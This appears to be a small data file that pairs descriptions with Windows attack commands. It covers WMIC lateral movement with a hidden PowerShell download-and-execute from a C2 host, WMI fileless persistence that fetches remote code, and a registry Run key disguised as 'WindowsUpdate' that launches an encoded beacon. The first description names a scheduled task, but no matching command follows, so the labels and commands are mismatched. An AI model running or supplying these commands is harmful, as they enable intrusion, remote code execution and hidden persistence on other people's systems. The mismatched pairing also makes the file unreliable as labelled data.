description: Scheduled task creating hourly encoded PowerShell beacon as SYSTEM
WMIC /node: remote process creation — lateral movement + IEX download
command: wmic /node:10.10.5.20 /user:CORP\Administrator process call create "cmd /c powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('hxxp://c2.lateral-move[.]xyz/agent.ps1'))"

description: WMI FilterToConsumerBinding fileless persistence — survives reboot, no file on disk
command: Set-WmiInstance -Namespace root\subscription -Class __EventFilter; Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{CommandLineTemplate='cmd /c powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString("hxxps://c2[.]xyz/a"))'}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding

description: Registry Run key persistence adding encoded PowerShell beacon
command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "powershell -w hidden -ep bypass -enc JABwACAAPQAgACIAaAB0AHQAcAA="  /f
